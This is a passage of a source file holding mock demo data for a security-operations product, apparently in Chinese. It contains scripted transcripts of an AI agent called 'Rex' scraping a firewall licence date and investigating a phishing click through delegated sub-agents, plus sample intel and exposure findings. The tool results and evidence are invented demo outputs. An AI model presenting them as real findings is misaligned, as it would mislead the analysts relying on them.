      { name: 'web2cli.click', target: '子导航: 授权中心', status: 'success', result: '进入授权中心，但默认展示授权概览。' },
      { name: 'web2cli.scroll', target: '授权中心向下滚动', status: 'success', result: '发现授权模块列表，但没有到期时间。' },
      { name: 'web2cli.click', target: '授权模块: 威胁情报库', status: 'success', result: '展开模块详情，出现版本号但没有整体到期时间。' },
      { name: 'web2cli.click', target: '授权模块: Web 防护', status: 'success', result: '展开模块详情，显示单模块授权时间。' },
      { name: 'web2cli.click', target: '右上角: 更多', status: 'success', result: '出现导出、刷新、授权详情三个操作。' },
      { name: 'web2cli.click', target: '更多菜单: 授权详情', status: 'success', result: '打开授权详情抽屉。' },
      { name: 'web2cli.scroll', target: '授权详情抽屉向下滚动', status: 'success', result: '找到设备 SN 和授权版本。' },
      { name: 'web2cli.scroll', target: '授权详情抽屉继续滚动', status: 'success', result: '找到授权开始时间，但到期时间在折叠区。' },
      { name: 'web2cli.click', target: '折叠区: 有效期信息', status: 'success', result: '展开有效期信息。' },
      { name: 'web2cli.read', target: '字段: License 到期时间', status: 'success', result: '读取到期时间 2026-06-10。' },
      { name: 'web2cli.read', target: '字段: 授权版本', status: 'success', result: '读取授权版本 Enterprise Threat Defense。' },
      { name: 'web2cli.record_path', target: '系统管理 -> 授权中心 -> 更多 -> 授权详情 -> 有效期信息', status: 'success', result: '已记录稳定路径，可生成 web2cli 工具。' },
    ],
  },
  {
    role: 'tool',
    sender: 'web2cli 工具生成 Tool',
    time: '15:33',
    content: '根据稳定页面路径生成 web2cli 工具定义和 Python 执行脚本。',
    toolCalls: [
      { name: 'write', target: 'firewall/web2cli/firewall_license_expiry.yml', status: 'success', result: '写入 web2cli 工具定义，声明登录入口、导航路径、字段抽取目标和输出 schema。' },
      { name: 'write', target: 'firewall/web2cli/scripts/get_firewall_license_expiry.py', status: 'success', result: '写入 Python 脚本，自动登录、点击授权详情、展开有效期信息并解析 SN、授权版本和到期时间。' },
      { name: 'python', target: 'get_firewall_license_expiry.py --device FW-HZ-DMZ-01', status: 'success', result: 'mock 执行成功：SN=HZFW2026052301，license_expire_at=2026-06-10。' },
    ],
  },
  { role: 'assistant', sender: 'Rex', time: '15:34', content: '设备接入完成：共接入 21 个告警数据 API、2 个设备健康检查 API、1 个 web2cli 接口。两台同型号防火墙会复用同一套工具，只替换 base_url、设备 ID 和凭证引用。' },
  { role: 'tool', sender: 'Agent 生成 Tool', time: '15:35', content: '已生成「杭州机房防火墙巡检 Agent」，能力包括健康状态巡检、License 到期检查、接口状态检查、告警量异常检测和公网暴露面联动。' },
  { role: 'tool', sender: 'Agent 执行 Tool', time: '15:36', content: '已立即执行巡检 Agent：FW-HZ-DMZ-01 健康，License 48 天后到期；FW-HZ-DMZ-02 CPU 偏高 76%，建议加入关注列表。' },
  { role: 'tool', sender: '定时任务 Tool', time: '15:37', content: '已将「杭州机房防火墙巡检 Agent」配置为每日 09:00 定时任务，并将异常结果推送到企业微信安全设备运维群。' },
  { role: 'assistant', sender: 'Rex', time: '15:38', content: '全部配置完成：两台杭州机房同型号防火墙已接入；告警数据、健康状态、License 到期时间均可自动获取；每日巡检和公网暴露面巡航已配置为定时任务。' },
];

export const intelBriefings = [
  { title: sharedStory.intelTopic, source: '微步 MCP', relevance: '高', action: `排查 ${sharedStory.cve} 影响资产` },
  { title: '供应链邮件投递活动升温', source: '行业情报', relevance: '中', action: '更新钓鱼演练素材' },
  { title: '云上 Redis 暴露扫描增加', source: 'OSINT', relevance: '中', action: '触发攻击面巡航' },
  { title: '勒索团伙利用弱口令 VPN 入侵', source: '威胁报告', relevance: '低', action: '检查 VPN 登录基线' },
];

export const investigationPlan = [
  { agent: '情报查询 Agent', status: '已完成', summary: `${sharedStory.attackerIp} 命中漏洞利用基础设施标签，可信度 92%。` },
  { agent: '资产上下文 Agent', status: '已完成', summary: `${sharedStory.asset} 位于 DMZ，承载支付回调入口。` },
  { agent: '日志检索 Agent', status: '运行中', summary: '正在拉取 WAF、NDR、主机审计三类日志做时间线对齐。' },
  { agent: '报告 Agent', status: '等待中', summary: '等待深度调查完成后生成值班摘要和工单描述。' },
];

export const deepInvestigations = [
  {
    id: 'INV-2026-0522-001',
    title: '财务实习生点击钓鱼链接后疑似凭证外泄',
    severity: 'P1',
    status: '调查中',
    owner: '终端安全组',
    entities: ['NDR', 'EDR', '邮件网关', 'OA'],
    summary: 'NDR 发现访问钓鱼链接，EDR 记录用户点击邮件链接，邮件网关命中可疑投递，OA 显示该用户为财务实习生。',
    evidence: [
      { source: 'NDR', time: '10:14', detail: '检测到终端 10.12.8.45 访问 hxxps://invoice-check.example/login，域名命中钓鱼情报。' },
      { source: 'EDR', time: '10:13', detail: '用户 li.yan 打开邮件附件并点击外部链接，浏览器进程由 outlook.exe 拉起。' },
      { source: '邮件网关', time: '10:11', detail: '拦截同主题邮件 27 封，其中 1 封投递成功，发件人伪装为供应商对账。' },
      { source: 'OA', time: '10:10', detail: 'li.yan 为财务实习生，入职 12 天，拥有报销系统只读权限。' },
    ],
    recommendation: '临时冻结账号外部访问，重置密码，检索同主题邮件收件人并发起二次确认。',
  },
  {
    id: 'INV-2026-0522-002',
    title: 'VPN 异常登录后访问财务共享目录',
    severity: 'P2',
    status: '待确认',
    owner: '办公网安全组',
    entities: ['VPN', 'AD', '文件审计', 'EDR'],
    summary: 'VPN 记录异地登录，AD 有失败重试，文件审计显示访问财务共享目录，EDR 未发现恶意进程。',
    evidence: [
      { source: 'VPN', time: '08:42', detail: '账号 zhang.qi 从非常用城市登录，设备指纹首次出现。' },
      { source: 'AD', time: '08:41', detail: '登录前 3 分钟出现 6 次密码失败，随后成功。' },
      { source: '文件审计', time: '08:46', detail: '访问 finance-share/2026-budget.xlsx，但未发生下载行为。' },
      { source: 'EDR', time: '08:49', detail: '终端在线且无新增可疑进程，建议联系用户确认。' },
    ],
    recommendation: '要求用户确认登录行为，若无法确认则吊销 VPN 会话并强制改密。',
  },
  {
    id: 'INV-2026-0522-003',
    title: '边界 WAF 告警与漏洞情报关联',
    severity: 'P1',
    status: '已升级',
    owner: sharedStory.assetOwner,
    entities: ['WAF', 'NDR', '微步 MCP', 'CMDB'],
    summary: `${sharedStory.asset} 命中漏洞探测，NDR 发现外联，微步 MCP 标记攻击源，CMDB 确认资产承载支付回调。`,
    evidence: [
      { source: 'WAF', time: '09:18', detail: '同一来源 IP 对 3 个业务域名进行路径穿越和指纹探测。' },
      { source: 'NDR', time: '09:12', detail: `${sharedStory.asset} 访问 ${sharedStory.attackerIp}，命中 C2 行为模型。` },
      { source: '微步 MCP', time: '09:24', detail: `${sharedStory.attackerIp} 近 24 小时被标记为漏洞利用基础设施。` },
      { source: 'CMDB', time: '09:27', detail: `${sharedStory.asset} 归属 ${sharedStory.assetOwner}，暴露支付回调入口。` },
    ],
    recommendation: '隔离管理面访问，触发漏洞验证和修复复测 Workflow。',
  },
];

export const agentInvestigationMessages = [
  {
    role: 'user',
    sender: '值班分析员',
    time: '10:15',
    content: '请调查财务实习生 li.yan 是否点击了钓鱼链接，并判断是否存在凭证外泄风险。',
  },
  {
    role: 'assistant',
    sender: 'Rex',
    time: '10:15',
    content: '先从网络侧确认是否真的访问了钓鱼站点。我会启动 NDR 调查 Agent 查询相关网络会话。',
  },
  {
    role: 'delegate',
    sender: 'Rex',
    time: '10:16',
    content: '启动 NDR 调查 Agent，确认终端是否访问钓鱼站点。',
    delegate: {
      title: 'NDR 调查 Agent',
      description: '网络侧访问链路和威胁情报命中分析',
      status: 'completed',
      elapsed: '42s',
      steps: 3,
    },
  },
  {
    role: 'tool',
    sender: 'NDR 调查 Agent',
    time: '10:16',
    content: '第一次按用户检索 NDR 会话没有结果，因为 NDR 只记录 IP。切换为从 EDR 获取的终端 IP 10.12.8.45 后，发现访问 hxxps://invoice-check.example/login。',
    toolCalls: [
      { name: 'ndr.search_by_user', target: 'li.yan', status: 'failed', result: 'NDR 不支持按用户名检索，需先解析终端 IP。' },
      { name: 'edr.resolve_user_endpoint', target: 'li.yan', status: 'success', result: '解析到终端 10.12.8.45 / hostname FIN-INTERN-07。' },
      { name: 'ndr.query_http_sessions', target: '10.12.8.45', status: 'success', result: '10:14 访问 hxxps://invoice-check.example/login，域名命中钓鱼情报。' },
    ],
    conclusion: 'NDR 侧确认该终端确实访问了钓鱼登录页，但无法证明是谁点击，需要继续从终端侧回溯用户行为。',
  },
  {
    role: 'assistant',
    sender: 'Rex',
    time: '10:16',
    content: 'NDR 不能直接按用户名检索，但现在拿到了终端 IP 和可疑访问记录。下一步需要从终端侧回溯是谁点击了链接，以及是否有文件落地。',
  },
  {
    role: 'delegate',
    sender: 'Rex',
    time: '10:17',
    content: '启动 EDR 调查 Agent，回溯终端进程树、浏览器访问和文件落地。',
    delegate: {
      title: 'EDR 调查 Agent',
      description: '终端行为、进程树和浏览器访问取证',
      status: 'completed',
      elapsed: '55s',
      steps: 3,
    },
  },
  {
    role: 'tool',
    sender: 'EDR 调查 Agent',
    time: '10:17',
    content: 'EDR 先检索文件落地未命中，再追踪进程树，确认 outlook.exe 拉起浏览器访问外部链接。未发现落地恶意文件。',
    toolCalls: [
      { name: 'edr.search_file_events', target: 'FIN-INTERN-07', status: 'success', result: '未发现可疑附件落地或执行。' },
      { name: 'edr.query_process_tree', target: 'FIN-INTERN-07', status: 'success', result: 'outlook.exe -> msedge.exe，命令行包含 invoice-check.example。' },
      { name: 'edr.collect_browser_history', target: 'li.yan', status: 'success', result: '10:14 打开钓鱼登录页，未发现后续下载行为。' },
    ],
    conclusion: 'EDR 侧确认 li.yan 通过 Outlook 邮件点击链接访问了钓鱼页面，暂未发现恶意文件落地或执行。',
  },
  {
    role: 'assistant',
    sender: 'Rex',
    time: '10:17',
    content: 'EDR 证实 outlook.exe 拉起浏览器访问外部链接。为了确认邮件投递范围和是否还有其他收件人，需要启动邮件网关 Agent。',
  },
  {
    role: 'delegate',
    sender: 'Rex',
    time: '10:18',
    content: '启动邮件网关 Agent，确认可疑邮件投递范围和是否存在绕过。',
    delegate: {
      title: '邮件网关 Agent',
      description: '邮件投递、短链接展开和同主题活动聚合',
      status: 'completed',
      elapsed: '1m12s',
      steps: 3,
    },
  },
  {
    role: 'tool',
    sender: '邮件网关 Agent',
    time: '10:18',
    content: '邮件网关按 IOC 没查到投递记录，改用主题和短链接特征扩大搜索，发现同主题邮件 27 封，其中 1 封投递成功。',
    toolCalls: [
      { name: 'mailgw.search_by_ioc', target: 'invoice-check.example', status: 'failed', result: '邮件正文使用短链接，原始域名未直接出现。' },
      { name: 'mailgw.expand_short_url', target: 't.ly/fp-verify', status: 'success', result: '短链接跳转到 hxxps://invoice-check.example/login。' },
      { name: 'mailgw.search_campaign', target: '供应商对账 / 发票确认', status: 'success', result: '发现 27 封同主题邮件，26 封拦截，1 封投递给 li.yan。' },
    ],
    conclusion: '邮件网关确认这是一次供应商对账主题钓鱼投递活动，大部分邮件已拦截，但 li.yan 收到并点击了其中一封。',
  },
  {
    role: 'assistant',
    sender: 'Rex',
    time: '10:18',
    content: '邮件网关确认 1 封投递成功。现在需要判断该用户的岗位、权限和潜在业务影响，所以继续查询 OA 与权限系统上下文。',
  },
  {
    role: 'delegate',
    sender: 'Rex',
    time: '10:19',
    content: '启动 OA 上下文 Agent，补全用户身份、岗位和业务权限。',
    delegate: {
      title: 'OA 上下文 Agent',
      description: '用户身份、组织关系和业务权限上下文',
      status: 'completed',
      elapsed: '31s',
      steps: 3,
    },
  },
  {
    role: 'tool',
    sender: 'OA 上下文 Agent',
    time: '10:19',
    content: 'OA 与权限系统确认 li.yan 为财务实习生，入职 12 天，仅有报销系统只读权限，无付款审批权限。',
    toolCalls: [
      { name: 'oa.get_user_profile', target: 'li.yan', status: 'success', result: '财务实习生，入职 12 天，直属导师 wang.min。' },
      { name: 'iam.list_business_permissions', target: 'li.yan', status: 'success', result: '报销系统只读权限，无付款审批权限。' },
      { name: 'oa.lookup_manager', target: 'li.yan', status: 'success', result: '建议通知导师 wang.min 和财务安全接口人。' },
    ],
    conclusion: 'OA 与权限系统确认该用户业务权限较低，凭证外泄影响主要集中在报销系统只读数据和后续横向钓鱼风险。',
  },
  {
    role: 'assistant',
    sender: 'Rex',
    time: '10:20',
    content: '多源证据形成闭环：邮件投递成功 -> 用户点击链接 -> NDR 访问钓鱼站点 -> OA 确认为低权限财务实习生。建议冻结外部访问、重置密码、检索同主题邮件收件人，并生成处置工单。',
  },
];

export const exposureFindings = [
  { title: '新增公网服务', detail: '发现 test-pay.example.com 暴露 8443 端口，未归属到 CMDB。' },
  { title: '证书即将过期', detail: 'api.example.com 证书 9 天后过期，建议自动创建提醒任务。' },
  { title: '影子资产认领', detail: '2 个子域名解析到云厂商临时 IP，Rex 建议关联业务 owner。' },
];

export const intelCards = [
  { title: sharedStory.intelTopic, detail: `微步 MCP 建议优先排查 ${sharedStory.cve} 与边界 WAF 资产。`, icon: Radar },
  { title: '供应链投递活动升温', detail: '财务主题附件在同业企业出现，建议同步钓鱼演练素材。', icon: MailWarning },
  { title: '边界暴露资产变化', detail: 'FOFA/证书源发现 3 个新增公网入口，建议进入攻击面巡航。', icon: Shield },
];
